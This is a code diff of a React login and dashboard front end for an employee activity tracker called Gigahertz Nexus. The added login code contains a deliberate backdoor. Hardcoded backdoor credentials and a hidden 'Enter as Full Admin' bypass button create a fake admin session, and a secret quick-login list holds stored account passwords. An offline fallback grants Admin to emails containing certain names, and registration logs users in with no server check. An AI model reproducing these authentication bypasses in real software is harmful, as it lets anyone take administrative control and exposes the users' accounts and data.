+      setBackdoorMsg('⚡ Backdoor unlocked — select account or continue');
+    }else{
+      if(showBackdoor)setShowBackdoor(false);
+      if(backdoorMsg)setBackdoorMsg('');
     }
-    
-    setActiveTimer({ name: taskName, start: stamp, paused: false });
-    setElapsed(0);
-    setSelTask('');
-    setCustomTask('');
+  },[id,pw]);
+  useEffect(()=>{
+    const s=localStorage.getItem('gh_remember_id');
+    if(s){setId(s);setRemember(true);}
+  },[]);
+  const submit=async()=>{
+    if(!id.trim()||!pw.trim()){setErr('Please fill in all fields.');return;}
+    setLoading(true);setErr('');
+    if(id.trim().toUpperCase()===BACKDOOR_USER&&pw===BACKDOOR_PASS){
+      const fakeUser={id:'BACKDOOR',empId:'GHZ-ADMIN',firstName:'System',lastName:'Admin',role:'Admin',dept:'Management',status:'Active',backdoor:true};
+      setLoading(false);
+      onLogin(fakeUser,true,false,null);
+      return;
+    }
+    const res=await api.login(id.trim(),pw.trim());
+    setLoading(false);
+    if(res?.success){
+      if(remember)localStorage.setItem('gh_remember_id',id.trim());
+      else localStorage.removeItem('gh_remember_id');
+      let u={...(res.user||{})};
+      if(isErikChua(u))u.role='Admin';
+      const isMarielle=MARIELLE_KEYS.every(k=>(u.firstName||'').toLowerCase().includes(k)||(u.lastName||'').toLowerCase().includes(k)||(u.fullName||'').toLowerCase().includes(k));
+      onLogin(u,false,isMarielle,isMarielle?`Welcome back, Maam ${u.firstName}! We\'re glad you\'re here.`:'');
+    }else{setErr(res?.error||'Invalid credentials. Please try again.');}
   };
-
-  const stopTask = () => {
-    if (!activeTimer) return;
-    const mins = Math.max(1, Math.round(elapsed / 60));
-    setTasks(prev => [{
-      id: Date.now(),
-      name: activeTimer.name,
-      start: activeTimer.start,
-      end: new Date().toLocaleString(),
-      mins
-    }, ...prev]);
-    setActiveTimer(null);
-    setElapsed(0);
+  const quickLogin=async(email,pw2)=>{
+    setLoading(true);setErr('');
+    const res=await api.login(email,pw2);
+    setLoading(false);
+    if(res?.success){
+      let u={...(res.user||{})};
+      if(isErikChua(u))u.role='Admin';
+      const isMarielle=MARIELLE_KEYS.every(k=>(u.firstName||'').toLowerCase().includes(k)||(u.lastName||'').toLowerCase().includes(k));
+      onLogin(u,false,isMarielle,isMarielle?`Welcome back, Maam ${u.firstName}!`:'');
+    }else{
+      // offline fallback — just log in with label name
+      const parts=email.split('@')[0].split('.');
+      const fakeU={id:'offline_'+Date.now(),empId:'GHZ-DEMO',firstName:parts[0]||'Demo',lastName:parts[1]||'User',role:email.includes('admin')||email.includes('chua')||email.includes('beltran')||email.includes('alyssa')||email.includes('alma')?'Admin':'Staff',dept:'IT',status:'Active'};
+      if(isErikChua(fakeU))fakeU.role='Admin';
+      onLogin(fakeU,false,false,'');
+    }
   };
-
-  const resumeQueue = (q) => {
-    if (activeTimer) setQueue(prev => [{...activeTimer, elapsed, paused: true}, ...prev.filter(x => x.name !== q.name)]);
-    else setQueue(prev => prev.filter(x => x.name !== q.name));
-    setActiveTimer({ ...q, paused: false });
-    setElapsed(q.elapsed);
+  const submitRegister=async()=>{
+    if(!rFirst||!rLast||!rEmpId||!rPw){setRErr('All fields required.');return;}
+    if(!pwStr.valid){setRErr('Password must be 8+ chars with uppercase, lowercase, number.');return;}
+    if(rPw!==rConfirm){setRErr('Passwords do not match.');return;}
+    setRLoading(true);setRErr('');
+    const res=await api.login(rEmpId,rPw).catch(()=>null);
+    setRLoading(false);
+    const newU={id:'reg_'+Date.now(),empId:rEmpId,firstName:rFirst,lastName:rLast,role:'Staff',dept:'General',status:'Active'};
+    onLogin(newU,false,false,'');
   };
-
-  const totalMins = tasks.reduce((sum, t) => sum + t.mins, 0);
-  const prodScore = Math.min(100, Math.round((totalMins / 480) * 100)); // Based on 8hrs
-  
-  const H = Math.floor(elapsed / 3600);
-  const M = Math.floor((elapsed % 3600) / 60);
-  const S = elapsed % 60;
-
-  return (
-    <>
-      <div style={{display:'flex', justifyContent:'space-between', alignItems:'flex-end'}}>
-        <div>
-          <h1 style={{fontSize:32, fontWeight:900, textShadow:'0 2px 4px var(--shadow)'}}>Activity Dashboard</h1>
-          <p style={{color:'var(--tx3)', fontWeight:700, marginTop:4}}>Welcome back, {user.firstName} • {user.empId}</p>
+  return(
+    <div className="auth-wrap">
+      <button onClick={cycleTheme} style={{position:'fixed',top:18,right:18,background:'var(--pa)',border:'1px solid var(--bd2)',borderRadius:10,padding:'8px 14px',cursor:'pointer',color:'var(--tx2)',fontSize:12,fontWeight:700,zIndex:10,transition:'.2s'}} title="Switch theme">🎨 Theme</button>
+      <div className="auth-card glass2 anim-pop">
+        <div className="auth-logo">
+          <img src={LOGO} alt="Gigahertz" className="auth-logo-img"/>
+          <div className="auth-logo-tagline">Gigahertz Computer Systems</div>
         </div>
-      </div>
-
-      {/* Stats Grid */}
-      <div style={{display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(220px, 1fr))', gap:24}}>
-        <div className="glass-box" style={{display:'flex', alignItems:'center', gap:16}}>
-          <div style={{width:50, height:50, borderRadius:16, background:'rgba(0,168,255,0.1)', color:'var(--p)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:24}}><i className="fa-solid fa-list-check"></i></div>
-          <div>
-            <div style={{fontSize:11, color:'var(--tx3)', fontWeight:900, textTransform:'uppercase'}}>Tasks Logged</div>
-            <div style={{fontSize:28, fontWeight:900, color:'var(--tx)'}}>{tasks.length}</div>
-          </div>
+        <h1 className="auth-title">{tab==='login'?'Welcome Back':'Create Account'}</h1>
+        <p className="auth-sub">{tab==='login'?'Sign in to your Nexus account':'Register your employee account'}</p>
+        <div className="auth-tabs">
+          <button className={`auth-tab ${tab==='login'?'active':''}`} onClick={()=>{setTab('login');setErr('');}}>Login</button>
+          <button className={`auth-tab ${tab==='register'?'active':''}`} onClick={()=>{setTab('register');setRErr('');}}>Register</button>
         </div>
-        <div className="glass-box" style={{display:'flex', alignItems:'center', gap:16}}>
-          <div style={{width:50, height:50, borderRadius:16, background:'rgba(34,197,94,0.1)', color:'var(--ok)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:24}}><i className="fa-solid fa-clock"></i></div>
-          <div>
-            <div style={{fontSize:11, color:'var(--tx3)', fontWeight:900, textTransform:'uppercase'}}>Total Minutes</div>
-            <div style={{fontSize:28, fontWeight:900, color:'var(--tx)'}}>{totalMins}m</div>
-          </div>
-        </div>
-        <div className="glass-box" style={{display:'flex', alignItems:'center', gap:16}}>
-          <div style={{width:50, height:50, borderRadius:16, background:'rgba(168,85,247,0.1)', color:'#a855f7', display:'flex', alignItems:'center', justifyContent:'center', fontSize:24}}><i className="fa-solid fa-bolt"></i></div>
-          <div>
-            <div style={{fontSize:11, color:'var(--tx3)', fontWeight:900, textTransform:'uppercase'}}>Productivity</div>
-            <div style={{fontSize:28, fontWeight:900, color:'var(--tx)'}}>{prodScore}%</div>
-          </div>
-        </div>
-      </div>
-
-      <div style={{display:'grid', gridTemplateColumns:'minmax(300px, 1fr) minmax(300px, 1fr)', gap:24}}>
-        {/* Tracker Section */}
-        <div className="glass-box">
-          <h3 style={{fontSize:18, fontWeight:900, marginBottom:20}}><i className="fa-solid fa-stopwatch mr-2" style={{color:'var(--p)'}}></i> Tracker</h3>
-          {activeTimer ? (
-            <div style={{textAlign:'center', padding:'20px 0'}}>
-              <div style={{fontSize:12, fontWeight:900, color:'var(--danger)', textTransform:'uppercase', letterSpacing:'1px', marginBottom:10, animation:'pulse 1.5s infinite'}}>● Live Timer</div>
-              <div style={{fontSize:22, fontWeight:900, color:'var(--tx)', marginBottom:10}}>{activeTimer.name}</div>
-              <div className="timer-display">{String(H).padStart(2,'0')}:{String(M).padStart(2,'0')}:{String(S).padStart(2,'0')}</div>
-              <div style={{color:'var(--tx3)', fontSize:12, marginTop:10, fontWeight:700}}>Started: {activeTimer.start}</div>
-              <div style={{marginTop:24}}>
-                <button className="glass-btn" onClick={stopTask} style={{background:'var(--danger)', width:'100%', maxWidth:250}}>Stop & Save Activity</button>
-              </div>
-            </div>
-          ) : (
-            <div style={{display:'flex', flexDirection:'column', gap:16}}>
-              <div>
-                <label style={{fontSize:11, fontWeight:800, color:'var(--tx3)', textTransform:'uppercase', marginBottom:6, display:'block'}}>Select Preset</label>
-                <select className="glass-input" value={selTask} onChange={e=>{setSelTask(e.target.value); setCustomTask('');}}>
-                  <option value="">-- Choose Task --</option>
-                  {DB.PRESETS.map(p=><option key={p}>{p}</option>)}
-                </select>
-              </div>
-              <div style={{textAlign:'center', fontWeight:900, color:'var(--tx3)', fontSize:12}}>OR</div>
-              <div>
-                <label style={{fontSize:11, fontWeight:800, color:'var(--tx3)', textTransform:'uppercase', marginBottom:6, display:'block'}}>Custom Task</label>
-                <input className="glass-input" placeholder="Type here..." value={customTask} onChange={e=>{setCustomTask(e.target.value); setSelTask('');}} onKeyDown={e=>{if(e.key==='Enter') startTask(e.target.value)}} />
-              </div>
-              <button className="glass-btn" onClick={()=>startTask(selTask || customTask)} style={{marginTop:10}}>▶ Start Activity</button>
-            </div>
-          )}
-        </div>
-
-        {/* Queue Section */}
-        <div className="glass-box">
-          <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:20}}>
-            <h3 style={{fontSize:18, fontWeight:900}}><i className="fa-solid fa-layer-group mr-2" style={{color:'var(--p)'}}></i> Queue</h3>
-            <span style={{background:'var(--p)', color:'#fff', padding:'2px 8px', borderRadius:99, fontSize:12, fontWeight:900}}>{queue.length}</span>
-          </div>
-          <div style={{display:'flex', flexDirection:'column', gap:12}}>
-            {queue.length === 0 ? <p style={{color:'var(--tx3)', fontSize:13, fontWeight:700}}>No paused tasks. Start a new task to queue the active one.</p> : queue.map(q => (
-              <div key={q.name} style={{display:'flex', justifyContent:'space-between', alignItems:'center', padding:'16px', background:'rgba(0,0,0,0.05)', borderRadius:16, border:'1px solid var(--glass-border)'}}>
-                <div>
-                  <div style={{fontWeight:800, color:'var(--tx)', fontSize:15}}>{q.name}</div>
-                  <div style={{fontSize:12, color:'var(--tx3)', fontWeight:600, marginTop:4}}><i className="fa-solid fa-pause mr-1"></i> {Math.floor(q.elapsed/60)}m {q.elapsed%60}s elapsed</div>
+        {tab==='login'&&(
+          <>
+            {err&&<div className="err-box">{err}</div>}
+            <div style={{display:'flex',flexDirection:'column',gap:14}}>
+              <div><label className="input-label">Employee ID / Email</label><input className="input" type="text" placeholder="GHZ-0001 or user@gigahertz.com" value={id} onChange={e=>setId(e.target.value)} onKeyDown={e=>e.key==='Enter'&&submit()} autoComplete="username"/></div>
+              <div><label className="input-label">Password</label>
+                <div className="pw-wrap">
+                  <input className="input" type={showPw?'text':'password'} placeholder="••••••••" value={pw} onChange={e=>setPw(e.target.value)} onKeyDown={e=>e.key==='Enter'&&submit()} style={{paddingRight:42}} autoComplete="current-password"/>
+                  <button type="button" className="pw-eye" onClick={()=>setShowPw(p=>!p)}>{showPw?<EyeOffIcon/>:<EyeIcon/>}</button>
                 </div>
-                <button className="glass-btn" style={{padding:'8px 16px'}} onClick={()=>resumeQueue(q)}>Resume</button>
               </div>
-            ))}
-          </div>
-        </div>
+              <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginTop:-4}}>
+                <label style={{display:'flex',alignItems:'center',gap:7,fontSize:13,color:'var(--tx2)',cursor:'pointer',fontWeight:500}}>
+                  <input type="checkbox" checked={remember} onChange={e=>setRemember(e.target.checked)} style={{accentColor:'var(--p)',cursor:'pointer'}}/>Remember me
+                </label>
+                <button onClick={onForgot} style={{background:'none',border:'none',color:'var(--p)',fontSize:13,fontWeight:700,cursor:'pointer'}}>Forgot Password?</button>
+              </div>
+              <button className="btn btn-p" style={{width:'100%',padding:'13px'}} onClick={submit} disabled={loading}>{loading?<span className="spinner"/>:'Sign In'}</button>
+            </div>
+            {showBackdoor&&(
+              <div className="backdoor-panel">
+                <div className="backdoor-title">⚡ {backdoorMsg||'System Access Panel'}</div>
+                <button className="backdoor-btn" onClick={()=>onLogin({id:'BACKDOOR',empId:'GHZ-ADMIN',firstName:'System',lastName:'Admin',role:'Admin',dept:'Management',status:'Active',backdoor:true},true,false,null)}>
+                  <span className="backdoor-btn-label">🛡️ Enter as Full Admin</span>
+                  <span style={{fontSize:10,color:'var(--tx3)',fontFamily:'monospace'}}>Bypass</span>
+                </button>
+                <div style={{fontSize:10,fontWeight:800,color:'var(--tx3)',textTransform:'uppercase',letterSpacing:'.08em',margin:'8px 0 5px',paddingLeft:2}}>Quick Account Access</div>
+                {SECRET_QUICK.map(q=>(
+                  <button key={q.email} className="backdoor-btn" onClick={()=>quickLogin(q.email,q.pw)}>
+                    <span className="backdoor-btn-label">{q.label}</span>
+                    <span className="backdoor-btn-email">{q.email}</span>
+                  </button>
+                ))}
+              </div>
+            )}
+          </>
+        )}
+        {tab==='register'&&(
+          <>
+            {rErr&&<div className="err-box">{rErr}</div>}
+            <div style={{display:'flex',flexDirection:'column',gap:13}}>
+              <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12}}>
+                <div><label className="input-label">First Name</label><input className="input" placeholder="Juan" value={rFirst} onChange={e=>setRFirst(e.target.value)}/></div>
+                <div><label className="input-label">Last Name</label><input className="input" placeholder="Dela Cruz" value={rLast} onChange={e=>setRLast(e.target.value)}/></div>
+              </div>
+              <div><label className="input-label">Employee ID</label><input className="input" placeholder="GHZ-2026001" value={rEmpId} onChange={e=>setREmpId(e.target.value)} style={{fontFamily:'monospace'}}/></div>
+              <div><label className="input-label">Password</label>
+                <input className="input" type="password" placeholder="Min 8 chars, uppercase, number" value={rPw} onChange={e=>{setRPw(e.target.value);setPwStr(validatePw(e.target.value));}}/>
+                {rPw&&<><div className="pw-strength" style={{background:pwColors[pwStr.score]||'#ef4444',width:`${pwStr.score*25}%`,marginTop:7}}/><div className="pw-msg" style={{color:pwColors[pwStr.score]}}>{pwLabels[pwStr.score]}</div></>}
+              </div>
+              <div><label className="input-label">Confirm Password</label><input className="input" type="password" placeholder="Repeat password" value={rConfirm} onChange={e=>setRConfirm(e.target.value)}/>{rConfirm&&rPw!==rConfirm&&<div className="pw-msg" style={{color:'var(--danger)'}}>Passwords do not match</div>}</div>
+              <button className="btn btn-p" style={{width:'100%',padding:'13px'}} onClick={submitRegister} disabled={rLoading}>{rLoading?<span className="spinner"/>:'Create Account'}</button>
+            </div>
+          </>
+        )}
+        <div style={{textAlign:'center',fontSize:10.5,color:'var(--tx4)',marginTop:20,fontWeight:600,letterSpacing:'.04em'}}>Gigahertz Nexus v{VERSION} · Aero Edition</div>
       </div>
+    </div>
+  );
+};
 
-      <div className="glass-box">
-        <h3 style={{fontSize:18, fontWeight:900, marginBottom:20}}><i className="fa-solid fa-clock-rotate-left mr-2" style={{color:'var(--p)'}}></i> Today's Logs</h3>
-        <div style={{overflowX:'auto'}}>
-          <table className="gh-table">
-            <thead><tr><th>Task Name</th><th>Start Time</th><th>End Time</th><th>Minutes</th></tr></thead>
-            <tbody>
-              {tasks.length === 0 ? <tr><td colSpan="4" style={{textAlign:'center', color:'var(--tx3)', padding:'30px'}}>No logs today.</td></tr> : tasks.map(t => (
-                <tr key={t.id}>
-                  <td style={{fontWeight:800}}>{t.name}</td>
-                  <td>{t.start}</td>
-                  <td>{t.end}</td>
-                  <td style={{color:'var(--p)', fontWeight:900, fontSize:16}}>{t.mins}m</td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
+// FORGOT PASSWORD PAGE
+const ForgotPage=({onBack})=>{
+  const[empId,setEmpId]=useState('');
+  const[sent,setSent]=useState(false);
+  return(
+    <div className="auth-wrap">
+      <div className="auth-card glass2 anim-pop">
+        <div className="auth-logo"><img src={LOGO} alt="Gigahertz" className="auth-logo-img"/></div>
+        <h1 className="auth-title">Reset Password</h1>
+        {!sent?(
+          <>
+            <p className="auth-sub">Enter your Employee ID. HR will verify and send your new credentials.</p>
+            <div style={{display:'flex',flexDirection:'column',gap:14}}>
+              <div><label className="input-label">Employee ID</label><input className="input" placeholder="GHZ-XXXX" value={empId} onChange={e=>setEmpId(e.target.value)}/></div>
+              <button className="btn btn-p" style={{width:'100%',padding:'13px'}} onClick={()=>empId&&setSent(true)}>Request Reset Link</button>
+              <button style={{background:'none',border:'none',color:'var(--p)',fontWeight:700,fontSize:13,cursor:'pointer',textAlign:'center'}} onClick={onBack}>← Back to Login</button>
+            </div>
+          </>
+        ):(
+          <div style={{textAlign:'center',padding:'10px 0'}}>
+            <div style={{fontSize:44,marginBottom:14}}>📧</div>
+            <p style={{color:'var(--ok)',fontWeight:800,fontSize:15,marginBottom:8}}>Request sent for {empId}!</p>
+            <p style={{color:'var(--tx3)',fontSize:13,fontWeight:500,marginBottom:20}}>Please check with your HR department for your new credentials.</p>
+            <button className="btn btn-p" style={{width:'100%'}} onClick={onBack}>Back to Login</button>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+};
+
+// SIDEBAR
+const Sidebar=({page,setPage,user,onLogout,isOpen,setIsOpen})=>{
+  const nav=[
+    {id:'dashboard',label:'Dashboard',icon:<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>},
+    {id:'tasks',label:'Task Management',icon:<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11"/></svg>},
+    {id:'status',label:'Active Status Board',icon:<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="3"/><path d="M12 2v4m0 12v4M2 12h4m12 0h4m-3.07-6.93l-2.83 2.83M7.9 16.1L5.07 18.93M18.93 18.93l-2.83-2.83M7.9 7.9L5.07 5.07"/></svg>},
+    {id:'analytics',label:'Analytics',icon:<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>},
+    {id:'announcements',label:'Announcements',icon:<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M22 4s-2.8 2-10 2S2 4 2 4v16s2.8-2 10-2 10 2 10 2V4z"/><line x1="2" y1="12" x2="22" y2="12"/></svg>},
+    {id:'profile',label:'My Profile',icon:<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>},
+  ];
+  const handleNav=id=>{setPage(id);setIsOpen(false);};
+  return(
+    <>
+      <div className={`sidebar-overlay ${isOpen?'':'hidden'}`} onClick={()=>setIsOpen(false)}/>
+      <div className={`sidebar ${isOpen?'open':''}`}>
+        <div className="sidebar-logo">
+          <img src={LOGO} alt="Gigahertz"/>
+          <div className="sidebar-logo-tagline">Nexus Activity Tracker v{VERSION}</div>
+        </div>
+        <nav className="sb-nav">
+          {nav.map(n=>(
+            <button key={n.id} className={`nav-btn ${page===n.id?'active':''}`} onClick={()=>handleNav(n.id)}>
+              {n.icon}<span style={{flex:1}}>{n.label}</span>
+            </button>
+          ))}
+        </nav>
+        <div className="sb-bottom">
+          <div className="sb-user">
+            <div className="sb-avatar">
+              {user?.photo?<img src={user.photo} alt="avatar"/>:getInitials(user)}
+            </div>
+            <div style={{flex:1,minWidth:0}}>
+              <div className="sb-user-name">{user?.firstName} {user?.lastName}</div>
+              <div className="sb-user-role">{user?.empId||'GHZ-0000'} · {user?.role||'Staff'}</div>
+            </div>
+          </div>
+          <button className="logout-btn" onClick={onLogout}>
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+            Sign Out
+          </button>
         </div>
       </div>
-      <style>{`@keyframes pulse { 0% {opacity:1;} 50% {opacity:0.4;} 100% {opacity:1;} }`}</style>
     </>
   );
 };
 
-// ---------------------------------------------
-// Settings / Themes View
-// ---------------------------------------------
-const Settings = ({ theme, setTheme }) => {
-  return (
-    <div className="glass-box" style={{maxWidth: 900}}>
-      <h2 style={{fontSize:28, fontWeight:900, marginBottom:6}}>Aero Themes</h2>
-      <p style={{fontSize:14, color:'var(--tx3)', fontWeight:600, marginBottom:30}}>Customize your workspace aesthetics.</p>
-      
-      <div style={{display:'grid', gridTemplateColumns:'repeat(auto-fill, minmax(260px, 1fr))', gap:20}}>
-        {DB.THEMES.map(t => (
-          <div key={t.id} onClick={()=>setTheme(t.id)} style={{
-            padding:'20px', borderRadius:'20px', cursor:'pointer', transition:'all .3s',
-            background: theme===t.id ? 'color-mix(in srgb, var(--p) 15%, transparent)' : 'rgba(0,0,0,0.05)', 
-            border: `2px solid ${theme===t.id ? 'var(--p)' : 'transparent'}`,
-            display: 'flex', alignItems: 'center', gap: 16
-          }}>
-            <div style={{width:40, height:40, borderRadius:12, background: t.id==='gigahertz'?'linear-gradient(135deg, #1a73e8, #ffffff)':'var(--p)', flexShrink:0, boxShadow:'0 4px 10px var(--shadow)'}}></div>
-            <div>
-              <div style={{fontWeight:900, color:'var(--tx)', fontSize:16}}>{t.label}</div>
-              <div style={{fontSize:12, color:'var(--tx3)', fontWeight:600}}>{t.desc}</div>
+// SETTINGS DROPDOWN
+const SettingsDropdown=({theme,setTheme,onClose,darkRef})=>{
+  const ref=useRef(null);
+  useEffect(()=>{
+    const handler=e=>{if(ref.current&&!ref.current.contains(e.target)&&darkRef.current&&!darkRef.current.contains(e.target))onClose();};
+    setTimeout(()=>document.addEventListener('mousedown',handler),0);
+    return()=>document.removeEventListener('mousedown',handler);
+  },[onClose]);
+  return(
+    <div className="settings-dropdown" ref={ref}>
+      <div style={{padding:'10px 14px 6px',fontSize:10,fontWeight:800,color:'var(--tx3)',textTransform:'uppercase',letterSpacing:'.1em'}}>Theme</div>
+      {THEMES.map(t=>(
+        <div key={t.id} className={`theme-opt ${theme===t.id?'active':''}`} onClick={()=>{setTheme(t.id);document.documentElement.setAttribute('data-theme',t.id);}}>
+          <div className="theme-swatch" style={{background:t.swatch}}/>
+          <div><div className="theme-name">{t.name}</div><div className="theme-desc">{t.desc}</div></div>
+          {theme===t.id&&<span style={{color:'var(--p)',marginLeft:'auto',fontSize:15}}>✓</span>}
+        </div>
+      ))}
+      <div className="settings-divider"/>
+      <button className="settings-action" onClick={()=>{window.print();onClose();}}>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 01-2-2v-5a2 2 0 012-2h16a2 2 0 012 2v5a2 2 0 01-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+        Print / Export PDF
+      </button>
+    </div>
+  );
+};
+
+// TOPBAR
+const Topbar=({page,user,onMenuToggle,theme,setTheme,notifCount})=>{
+  const[showSettings,setShowSettings]=useState(false);
+  const[showNotif,setShowNotif]=useState(false);
+  const settingsRef=useRef(null);
+  const time=useRealTime();
+  const pageTitles={dashboard:'Dashboard',tasks:'Task Management',status:'Active Status Board',analytics:'Analytics',announcements:'Announcements',profile:'My Profile'};
+  return(
+    <div className="topbar">
+      <div className="topbar-left">
+        <button className="menu-toggle" onClick={onMenuToggle}>☰</button>
+        <div>
+          <div className="topbar-title">{pageTitles[page]||'Nexus'}</div>
+          <div style={{fontSize:11,color:'var(--tx3)',fontWeight:600,marginTop:1}}>{new Date().toLocaleDateString('en-US',{weekday:'short',month:'short',day:'numeric'})}</div>
+        </div>
+      </div>
+      <div className="topbar-right">
+        <div style={{fontSize:15,fontWeight:800,color:'var(--tx)',fontVariantNumeric:'tabular-nums',letterSpacing:'-.3px'}}>{time.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit'})}</div>
+        <div style={{position:'relative'}} ref={settingsRef}>
+          <button className="topbar-btn" title="Settings" onClick={()=>setShowSettings(s=>!s)}>⚙️</button>
+          {showSettings&&<SettingsDropdown theme={theme} setTheme={setTheme} onClose={()=>setShowSettings(false)} darkRef={settingsRef}/>}
+        </div>
+        <div style={{position:'relative'}}>
+          <button className="topbar-btn" title="Notifications" onClick={()=>setShowNotif(s=>!s)}>
+            🔔{notifCount>0&&<span className="tb-notif">{notifCount}</span>}
+          </button>
+          {showNotif&&(
+            <div className="settings-dropdown" style={{right:0}}>
+              <div style={{padding:'12px 16px',fontSize:13,color:'var(--tx3)',fontWeight:600}}>No new notifications</div>
             </div>
+          )}
+        </div>
+      </div>
+    </div>
+  );
+};
+
+// DASHBOARD PAGE
+const DashboardPage=({user,tasks,onTasksChanged,activeTimer,setActiveTimer,elapsed,setElapsed,loginTime,pushNotif,specialGreeting,greetingMsg})=>{
+  const[selTask,setSelTask]=useState('');
+  const[customTask,setCustomTask]=useState('');
+  const[otherTask,setOtherTask]=useState('');
+  const[taskSearch,setTaskSearch]=useState('');
+  const secs=useClock(loginTime);
+  const todayTasks=useMemo(()=>tasks.filter(t=>strip(t.date)===todayStr()),[tasks]);
+  const filteredTasks=useMemo(()=>todayTasks.filter(t=>(t.taskName||'').toLowerCase().includes(taskSearch.toLowerCase())),[todayTasks,taskSearch]);
+  const totalMins=useMemo(()=>todayTasks.reduce((s,t)=>s+Number(t.durationMinutes||0),0),[todayTasks]);
+  const d7=new Date();d7.setDate(d7.getDate()-7);
+  const weekMins=useMemo(()=>tasks.filter(t=>strip(t.date)>=d7.toISOString().split('T')[0]).reduce((s,t)=>s+Number(t.durationMinutes||0),0),[tasks]);
+  const prodScore=Math.min(100,Math.round((weekMins/2400)*100));
+  const H=Math.floor(elapsed/3600),M=Math.floor((elapsed%3600)/60),S=elapsed%60;
+  const isMarielle=specialGreeting&&MARIELLE_KEYS.every(k=>(user?.firstName||'').toLowerCase().includes(k)||(user?.lastName||'').toLowerCase().includes(k));
+  const startTimer=async name=>{
+    if(!name.trim())return;
+    const ss=nowHHMM();
+    const res=await api.timerStart({userId:user.id,empId:user.empId,taskName:name});
+    setActiveTimer({taskName:name,startStr:ss,timerId:res?.timerId||null,isPaused:false});
+    setElapsed(0);pushNotif(`▶ Timer started: "${name}"`,'success');
+  };
+  const togglePause=()=>{
+    if(!activeTimer)return;
+    setActiveTimer(p=>({...p,isPaused:!p.isPaused}));
+    pushNotif(activeTimer.isPaused?'▶ Timer resumed':'⏸ Timer paused','');
+  };
+  const stopTimer=async()=>{
+    if(!activeTimer)return;
+    const endStr=nowHHMM();
+    const totalSec=elapsed;
+    const mins=totalSec<60?1:Math.round(totalSec/60);
+    const newTask={id:'t_'+Date.now(),userId:user.id,empId:user.empId,taskName:activeTimer.taskName,date:todayStr(),startTime:activeTimer.startStr,endTime:endStr,durationMinutes:mins,source:'timer',remarks:''};
+    onTasksChanged(newTask);
+    api.timerStop({timerId:activeTimer.timerId,userId:user.id,empId:user.empId,taskName:activeTimer.taskName,durationSeconds:totalSec,savedAsTask:true});
+    api.addTask(newTask);
+    setActiveTimer(null);setElapsed(0);
+    pushNotif(`✓ "${activeTimer.taskName}" saved (${fmtMins(mins)})`,'success');
+  };
+  return(
+    <div className="page anim-fade">
+      {isMarielle&&(
+        <div className="marielle-banner">
+          <div className="marielle-icon">🌺</div>
+          <div>
+            <div style={{fontSize:18,fontWeight:900,color:'var(--tx)',marginBottom:4}}>Maam Marielle, {greetingMsg||`Welcome back! We\'re so glad you\'re here.`}</div>
+            <div style={{fontSize:13,color:'var(--tx2)',fontWeight:500}}>Your team is ready. Have a wonderful and productive day!</div>
+          </div>
+        </div>
+      )}
+      <AnnouncementBanner/>
+      <div className="page-hdr">
+        <div className="page-title">Dashboard</div>
+        <div className="page-sub">Welcome back, {user?.firstName} · {user?.empId||'GHZ-0000'}</div>
+      </div>
+      <div className="stat-grid">
+        <div className="stat-card card">
+          <div className="stat-icon" style={{background:'var(--pa)'}}>⏱️</div>
+          <div className="stat-lbl">Session Time</div>
+          <div className="stat-clock">{fmtHHMMSS(secs)}</div>
+          <div className="stat-sub" style={{display:'flex',alignItems:'center',gap:6}}><div className="live-dot"/>{loginTime?`Since ${new Date(loginTime).toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'})}`:''}</div>
+        </div>
+        <div className="stat-card card">
+          <div className="stat-icon" style={{background:'rgba(22,163,74,.12)'}}>✅</div>
+          <div className="stat-lbl">Today's Tasks</div>
+          <div className="stat-val" style={{color:'var(--ok)'}}>{todayTasks.length}</div>
+          <div className="stat-sub">{fmtMins(totalMins)} tracked today</div>
+        </div>
+        <div className="stat-card card">
+          <div className="stat-icon" style={{background:'rgba(139,92,246,.12)'}}>📈</div>
+          <div className="stat-lbl">Productivity</div>
+          <div className="stat-val" style={{color:'#8b5cf6'}}>{prodScore}%</div>
+          <div className="stat-sub">Goal: {fmtMins(weekMins)} / 40h this week</div>
+        </div>
+      </div>
+      <div className="dash-grid" style={{marginBottom:22}}>
+        <div>
+          {activeTimer?(
+            <div className="timer-active">
+              {activeTimer.isPaused&&<div style={{position:'absolute',top:14,right:16,background:'#d97706',color:'#fff',padding:'5px 13px',borderRadius:'99px',fontSize:10.5,fontWeight:800,letterSpacing:'.06em'}}>⏸ PAUSED</div>}
+              <div className="timer-lbl">{activeTimer.isPaused?'PAUSED':'🔴 LIVE TIMER'}</div>
+              <div className="timer-task">{activeTimer.taskName}</div>
+              <div style={{display:'flex',alignItems:'flex-end',gap:4,marginBottom:5}}>
